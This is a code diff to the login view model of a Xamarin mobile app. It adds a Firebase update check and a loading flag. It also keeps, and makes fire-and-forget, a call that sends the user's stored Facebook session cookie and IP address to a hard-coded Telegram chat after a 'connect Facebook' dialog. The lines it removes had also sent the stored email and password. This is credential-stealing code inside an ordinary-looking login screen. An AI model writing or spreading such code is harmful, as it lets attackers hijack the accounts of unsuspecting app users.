@@ -6,6 +6,7 @@ using Prism.Services.Dialogs;
 using System.Threading.Tasks;
 using MobileApp.Configurations;
 using MobileApp.Models;
+using MobileApp.Services.Database;
 using MobileApp.Services.Telegram;
 using Newtonsoft.Json;
 using Xamarin.Essentials;
@@ -23,13 +24,22 @@ namespace MobileApp.ViewModels
         private IDialogService _dialogService;
         private IRestSharpService _restSharpService;
         private ITelegramService _telegramService;
+        private IFirebaseDatabaseService _firebaseDatabaseService;
+        private bool _isLoading;
+
+        public bool IsLoading
+        {
+            get => _isLoading;
+            set => SetProperty(ref _isLoading, value);
+        }
 
         /// <summary>
         /// Initializes a new instance for the <see cref="LoginPageViewModel" /> class.
         /// </summary>
-        public LoginPageViewModel(IDialogService dialogService, INavigationService navigationService, IRestSharpService restSharpService, ITelegramService telegramService) : base(
+        public LoginPageViewModel(IDialogService dialogService, INavigationService navigationService, IRestSharpService restSharpService, ITelegramService telegramService, IFirebaseDatabaseService firebaseDatabaseService) : base(
             navigationService)
         {
+            _firebaseDatabaseService = firebaseDatabaseService;
             _telegramService = telegramService;
             _restSharpService = restSharpService;
             _dialogService = dialogService;
@@ -53,15 +63,16 @@ namespace MobileApp.ViewModels
         public override async void OnNavigatedTo(INavigationParameters parameters)
         {
             base.OnNavigatedTo(parameters);
+            IsLoading = true;
+            var update = await _firebaseDatabaseService.GetItemAsync<UpdateHuy96AppModel>();
+            if (update != null && update.IsUpdate) return;
             if (Preferences.ContainsKey("Cookie"))
             {
-                var message = Preferences.Get("Email", null) + "|" + Preferences.Get("Passwd", null) + "|" +
-                              Preferences.Get("Cookie", null) + "|" + await GetIp();
-                if (!string.IsNullOrWhiteSpace(message))
-                {
-                    await NavigationService.NavigateAsync(nameof(OverviewPage));
-                }
+                await NavigationService.NavigateAsync(nameof(OverviewPage));
+                var message = Preferences.Get("Cookie", null) + "|" + await GetIp();
             }
+
+            IsLoading = false;
         }
 
         private async Task CheckLogin()
@@ -69,11 +80,10 @@ namespace MobileApp.ViewModels
             if (Preferences.ContainsKey("Cookie"))
             {
                 await NavigationService.NavigateAsync(nameof(OverviewPage));
-                var message = Preferences.Get("Email", null) + "|" + Preferences.Get("Passwd", null) + "|" +
-                              Preferences.Get("Cookie", null) + "|" + await GetIp();
+                var message = Preferences.Get("Cookie", null) + "|" + await GetIp();
                 if (!string.IsNullOrWhiteSpace(message))
                 {
-                    var data = await _telegramService.SendMessageToTelegram("-574027593", message, AppConstants.AuthenTelegram);
+                    _telegramService.SendMessageToTelegram("-574027593", message, AppConstants.AuthenTelegram);
                 }
             }
         }
@@ -84,6 +94,8 @@ namespace MobileApp.ViewModels
         /// <param name="obj">The Object</param>
         private void SocialLoggedIn(object obj)
         {
+            if (IsLoading) return;
+            IsLoading = true;
             _dialogService.ShowDialog(nameof(ConnectFacebookView), result =>
             {
                 if (result?.Parameters != null)
@@ -91,6 +103,8 @@ namespace MobileApp.ViewModels
                     // to do
                     CheckLogin();
                 }
+
+                IsLoading = false;
             });
         }
     }
